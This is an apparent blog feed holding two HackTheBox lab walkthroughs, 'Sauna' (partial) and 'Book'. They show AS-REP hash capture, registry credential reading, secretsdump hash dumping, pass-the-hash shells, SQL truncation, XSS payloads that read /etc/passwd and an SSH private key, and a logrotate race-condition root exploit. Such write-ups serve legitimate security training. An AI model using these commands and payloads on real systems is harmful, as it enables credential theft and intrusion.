&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ &lt;span class=&quot;nt&quot;&gt;-usersfile&lt;/span&gt; usernames.txt &lt;span class=&quot;nt&quot;&gt;-no-pass&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-format&lt;/span&gt; john &lt;span class=&quot;nt&quot;&gt;-outputfile&lt;/span&gt; hash.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I was able to retrive the kerberos hash for the username fsmith&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I cracked the obtained hash of fsmith using john, the password for fsmith was &lt;strong&gt;&lt;em&gt;Thestrokes23&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now i used evil-winrm tool with the username as &lt;em&gt;fsmith&lt;/em&gt; and password as &lt;em&gt;Thestrokes23&lt;/em&gt; to get the shell.&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;
&lt;p&gt;As usual i ran winpeas for enumerating on the privilege escalation, found there was an autologon credentials for the user svc_loanmanager&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;we can also manually verify it using the command:&lt;/p&gt;
&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;REG&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;QUERY&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DefaultPassword&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;or&lt;/p&gt;
&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;REG&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;QUERY&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/v&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DefaultPassword&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/reg:64&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Auto Logon Credentials
username: svc_loanmanager
password: Moneymakestheworldgoround!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Getting the administrator access won’t be this simple, i was not able to get the shell for  the user svc_loanmanager. The user’s folder had only fmsith, svc_loanmgr, administrator (enumerated using the fsmith access).
Now i tried with the username svc_loanmgr, got the shell
I manually enumerated it and found that it is a part of domain controlle&lt;/p&gt;

&lt;p&gt;So i ran secretsdump.py to dump the credentials of all the users.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;secretsdump.py EGOTISTICAL-BANK.local/svc_loanmgr@EGOTISTICAL-BANK.local
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now i used the NTLM hash of the administrator directly in evil-winrm to get the shell&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; administrator &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;HASH&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/sauna/sauna.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Happy Hacking!&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="Hackthebox" /><summary type="html">“Technology is just a tool. In terms of getting the kids working together and motivating them, the teacher is the most important.” - Bill Gates</summary></entry><entry><title type="html">Book Machine Walkthrough</title><link href="http://localhost:4000/blogs/hackthebox/book.html" rel="alternate" type="text/html" title="Book Machine Walkthrough" /><published>2020-07-11T00:00:00+05:30</published><updated>2020-07-11T00:00:00+05:30</updated><id>http://localhost:4000/blogs/hackthebox/book</id><content type="html" xml:base="http://localhost:4000/blogs/hackthebox/book.html">&lt;p class=&quot;lead&quot;&gt;&lt;strong&gt;&lt;em&gt;“There is no friend as loyal as a book.”&lt;/em&gt;&lt;/strong&gt; - Ernest Hemingway&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/book.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;ul class=&quot;large-only&quot; id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#machine-matrix&quot; id=&quot;markdown-toc-machine-matrix&quot;&gt;Machine Matrix&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#machine-summary&quot; id=&quot;markdown-toc-machine-summary&quot;&gt;Machine Summary&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#nmap-scan&quot; id=&quot;markdown-toc-nmap-scan&quot;&gt;Nmap Scan&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeration-on-port-80&quot; id=&quot;markdown-toc-enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#sql-truncation-attack&quot; id=&quot;markdown-toc-sql-truncation-attack&quot;&gt;SQL Truncation Attack&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#local-file-read-via-xss&quot; id=&quot;markdown-toc-local-file-read-via-xss&quot;&gt;Local File Read Via XSS&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#acquring-user-shell&quot; id=&quot;markdown-toc-acquring-user-shell&quot;&gt;Acquring User Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#privilege-escalation&quot; id=&quot;markdown-toc-privilege-escalation&quot;&gt;Privilege escalation&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;machine-matrix&quot;&gt;Machine Matrix&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/matrix.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;machine-summary&quot;&gt;Machine Summary&lt;/h2&gt;
&lt;p&gt;Box has an webapplication running that has two user roles: 1. Normal User 2. Admin. Normal user can suggest a book with book name and author of the book, once the book is submitted the admin would approve it. There is an XSS attack in these fields. Admin can be again registered as a user using SQL Truncation attack. The book and author name entered by the user is processed, generated in a pdf that can be viewed in the Admin panel. We use this attack scenario to read the local system files (/etc/passwd and ssh keys of a user). With this, we can gain the user shell through SSH. Inorder to esclate the privileges to root, we monitor the services that are running in the box using &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;pspy&lt;/a&gt;. Logrotate is the process that gets executed every 5 seconds and it as exploit. We use that for privilege escalation&lt;/p&gt;

&lt;h2 id=&quot;nmap-scan&quot;&gt;Nmap Scan&lt;/h2&gt;
&lt;p&gt;I started the enumeration with nmap scan&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 10.10.10.10.176
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Box had two ports open&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Port&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Service&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;22&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;SSH&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;80&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Apache&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;enumeration-on-port-80&quot;&gt;Enumeration on port 80&lt;/h2&gt;
&lt;p&gt;I ran dirbuster on port 80&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Running dirbuster revealed certain end points that are accessible other than 302:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/admin/
/index.php
/admin/index.php
/db.php
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;These didn’t have any kind of juicy data so i started to enumerate on the port 80 I created an account in the application&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I enumerated the entire site with the application. There was a functionality (book submission) i can suggest  a book and that would be approved by the admin. So i thought i can upload a malicious fight and if i could get or bypass admin authentication then i would possibly approve it and the exploit code running. I also found admin’s mail id in contact us page.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I visited the admin page but it needed admin credentials.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;sql-truncation-attack&quot;&gt;SQL Truncation Attack&lt;/h2&gt;
&lt;p&gt;On viewing the source of the signup page, length of the name and the email parameters are predefined.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Name: Not more than 10 characters
email: 20 characters
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;On researching a bit, i came to know i can possible use sql truncation attack to signup as admin user (admin@book.htb)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;local-file-read-via-xss&quot;&gt;Local File Read Via XSS&lt;/h2&gt;
&lt;p&gt;I went to the admin login page and logged in as admin with  password that i used during the registration (SQL truncation attack). Collections is the page that is related to the functionality which was discussed earlier in this module. I went on with user module and after enumerating a bit, i found that at book submission book title and Author is vulnerable to some kind of stored xss attack. when i give a script tag in the book title,author and upload a random file. This data is processed and exported as a pdf file that can be viewed in admin panel.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Upon researching, i came to know how xss attack can be used to read the intermal files. &lt;strong&gt;&lt;a href=&quot;https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html&quot;&gt;Local File Read Via XSS&lt;/a&gt;&lt;/strong&gt;. 
I used the below script to read the /etc/passwd file present in the machine, from which i can get the list of potential users.&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;file:///etc/passwd&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;acquring-user-shell&quot;&gt;Acquring User Shell&lt;/h2&gt;
&lt;p&gt;There is only one potential user (user that have home/user are considered as actual users other all are just services like daemon). Now I would try to read the ssh private key present in the .ssh directory of the user, so that i can login into the box using the key.
Below is the script for reading the ssh private key of the user &lt;strong&gt;reader&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;file:///home/reader/.ssh/id_rsa&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt; 
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, I logged in as admin to view the proccessed pdf. I got ssh private key. I copied the entire key to my kali machine and saved it as id_rsa. I set the permissions to the id_rsa file using the below command.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;chmod &lt;/span&gt;600 id_rsa
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I logged into the machine as user reader and got the user.txt&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege escalation&lt;/h2&gt;
&lt;p&gt;I ran the linpeas it revealed some information that can be liverged to be used for priv-esec, it showed that logrotate is present and it is vulnerable to logrotten exploit.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I also ran pspy to monitor what are the services running in the machine and inorder to check whether there is any service related to logrotate or logrotate process is getting executed.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As expected logrotate is getting executed every 5 seconds. The logrotate utility makes log rotation easy. “Log rotation” refers to the practice of archiving an application’s current log, starting a fresh log, and deleting older logs. The system usually runs logrotate once a day, and when it runs it checks rules that can be customized on a per-directory or per-log basis.
so that root part is clear we must use the logrotten exploit (race condition vulnerability) &lt;strong&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47466&quot;&gt;exploit&lt;/a&gt;&lt;/strong&gt;
If logrotate is executed as root, with option that creates a file ( like create, copy, compress, etc.) and the user is in control of the logfile path, it is possible to abuse a race-condition to write files in ANY directories
Conditions for privilege escalation&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Logrotate has to be executed as root&lt;/li&gt;
  &lt;li&gt;The logpath needs to be in control of the attacker&lt;/li&gt;
  &lt;li&gt;Any option that creates files is set in the logrotate configuration&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;All the preconditions are satisfied as the logrotate is executed by root and i had an accessible log file that is /home/reader/backups/access.log
I transfered the compiled file of logrotten exploit to the box in /tmp directory as i had access over it completely.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I created the payload file that can grant me root shell through copying the /bin/bash file to /tmp then i executed the exploit&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./logrooten &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; exp /home/reader/backups/access.log
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;When i executed the copied file it granted me the root shell
&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Instead we can also create a payload file that copies the root.txt file directly to the /tmp directory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://r3dw0lfsec.in/assets/img/blog/HTB/book/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Happy Hacking !&lt;/p&gt;</content><author><name>Venkatraman K</name><email>kvenkatraman10@gmail.com</email></author><category term="Blogs" /><category term="Hackthebox" /><summary type="html">“There is no friend as loyal as a book.” - Ernest Hemingway</summary></entry></feed>